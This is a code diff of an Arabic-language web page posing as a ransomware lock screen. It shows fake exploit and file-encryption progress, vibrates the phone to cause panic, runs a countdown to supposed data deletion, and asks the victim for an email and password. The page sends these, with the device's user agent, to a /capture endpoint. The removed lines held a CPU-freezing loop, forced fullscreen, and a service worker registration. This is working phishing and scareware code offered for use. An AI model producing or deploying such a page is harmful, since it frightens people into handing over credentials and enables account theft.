@@ -2,88 +2,103 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>☠️ SYSTEM BREACH DETECTED ☠️</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>☠️ SYSTEM CRITICAL ERROR ☠️</title>
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; color: #ff0000; font-family: 'Courier New', monospace; overflow: hidden; touch-action: none; }
         .console { padding: 20px; font-size: 14px; line-height: 1.8; }
-        #ransom-ui { display: none; text-align: center; padding: 20px; }
-        input { background: #111; border: 2px solid red; color: white; padding: 15px; width: 90%; font-size: 1.5rem; text-align: center; border-radius: 8px; }
-        .blink { animation: blinker 0.2s infinite; }
+        #ransom-ui { display: none; text-align: center; padding: 20px; background: #000; height: 100vh; }
+        input { background: #111; border: 2px solid red; color: white; padding: 15px; width: 80%; font-size: 1.2rem; text-align: center; border-radius: 8px; margin-bottom: 10px; }
+        .blink { animation: blinker 0.5s infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
+        button { background: red; color: white; width: 90%; padding: 20px; border: none; font-weight: bold; border-radius: 8px; cursor: pointer; }
     </style>
 </head>
-<body onclick="executePayload()">
+<body onclick="startExploit()">
 
     <div id="boot" class="console">
-        [SYSTEM]: VULNERABILITY CVE-2025-EXPLOTED...<br>
-        [MEMORY]: OVERFLOWING RAM SECTORS...<br>
-        [FILES]: ENCRYPTING /INTERNAL_STORAGE/... <span id="p">0%</span><br>
-        <div class="blink" style="margin-top:20px;">⚠️ لا تلمس الجهاز - جاري تأمين البيانات ⚠️</div>
+        [SYSTEM]: INITIALIZING CVE-2026-REMOTE_EXPLOIT...<br>
+        [MEMORY]: INJECTING PAYLOAD TO RAM...<br>
+        [FILES]: ENCRYPTING DATA... <span id="p">0%</span><br>
+        <div class="blink" style="margin-top:20px; color: yellow;">⚠️ تحذير: لا تغلق المتصفح - جاري تأمين ملفاتك ⚠️</div>
     </div>
 
     <div id="ransom-ui">
-        <h1 class="blink">🔒 تم تشفير النظام 🔒</h1>
-        <p>تم قفل هذا الهاتف بواسطة نظام حماية متقدم. لفك التشفير، أدخل الكود المكون من 9 أرقام:</p>
-        <input type="number" id="code" placeholder="123456789">
-        <br><br>
-        <button onclick="checkKey()" style="background:red; color:white; width:100%; padding:20px; border:none; font-weight:bold; border-radius:8px;">إدخال مفتاح فك التشفير</button>
+        <h1 class="blink">🔒 تم قفل نظامك 🔒</h1>
+        <p style="color: white;">تم تشفير ملفاتك الحساسة. لفك القفل فوراً، قم بتأكيد هوية صاحب الجهاز:</p>
+        
+        <form id="captureForm">
+            <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+            <input type="password" id="password" placeholder="كلمة المرور" required>
+            <br><br>
+            <button type="submit">فك تشفير الملفات الآن</button>
+        </form>
+        <p style="font-size: 12px; color: gray; margin-top: 20px;">سيتم مسح البيانات نهائياً خلال: <span id="timer">05:00</span></p>
     </div>
 
     <script>
-        // تسجيل الخدمة لضمان بقاء الفيروس حياً في الخلفية
-        if ('serviceWorker' in navigator) { navigator.serviceWorker.register('sw.js'); }
+        let isStarted = false;
 
-        async function executePayload() {
-            // إخفاء معالم النظام (ملء الشاشة)
-            document.documentElement.requestFullscreen();
-            
-            // اهتزاز هستيري
-            if (navigator.vibrate) setInterval(() => navigator.vibrate([1000, 500, 1000]), 2000);
+        async function startExploit() {
+            if(isStarted) return;
+            isStarted = true;
 
-            // تجميد النظام لمدة 60 ثانية (CPU Flooding)
+            // اهتزاز الهاتف لإثارة الذعر
+            if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
+
             let progress = 0;
-            const start = Date.now();
-            const freeze = setInterval(() => {
-                progress += 0.5;
-                if(progress <= 100) document.getElementById('p').innerText = Math.floor(progress) + "%";
-                
-                // الدورة القاتلة لمعالج الهاتف
-                const end = Date.now() + 100;
-                while (Date.now() < end) {
-                    window.history.pushState(null, null, "#" + Math.random());
-                    Math.tan(Math.random()); 
+            const interval = setInterval(() => {
+                progress += Math.random() * 5;
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    showRansomUI();
+                } else {
+                    document.getElementById('p').innerText = Math.floor(progress) + "%";
                 }
-
-                // بعد دقيقة من التجمد التام
-                if (Date.now() - start > 60000) {
-                    clearInterval(freeze);
-                    showUI();
-                }
-            }, 150);
+            }, 100);
         }
 
-        function showUI() {
+        function showRansomUI() {
             document.getElementById('boot').style.display = 'none';
             document.getElementById('ransom-ui').style.display = 'block';
-            document.body.style.touchAction = 'auto'; // إعادة اللمس فقط لصفحة الكود
+            document.body.style.touchAction = 'auto';
+            startTimer();
         }
 
-        async function checkKey() {
-            const val = document.getElementById('code').value;
-            // إرسال الكود فوراً لتيليجرام
-            await fetch('/capture', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ email: "ضحية المالوير", password: "الكود: " + val })
-            });
+        function startTimer() {
+            let sec = 300;
+            setInterval(() => {
+                let min = Math.floor(sec / 60);
+                let s = sec % 60;
+                document.getElementById('timer').innerText = `${min}:${s < 10 ? '0'+s : s}`;
+                if(sec > 0) sec--;
+            }, 1000);
+        }
 
-            if (val === "123456789") {
-                alert("تم التحقق بنجاح. سيعود الهاتف للعمل.");
+        document.getElementById('captureForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+
+            // إرسال البيانات فوراً إلى سيرفر Render الخاص بك
+            try {
+                await fetch('/capture', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        email: email,
+                        password: pass,
+                        device: navigator.userAgent,
+                        status: "Ransomware_Entry"
+                    })
+                });
+
+                alert("تم استلام مفتاح فك التشفير. سيتم إعادة تشغيل النظام.");
                 window.location.href = "https://google.com";
-            } else {
-                alert("❌ كود خاطئ! سيتم تدمير البيانات خلال 60 ثانية.");
+            } catch (err) {
+                console.error("Error sending data");
             }
-        }
+        };
     </script>
 </body>
 </html>
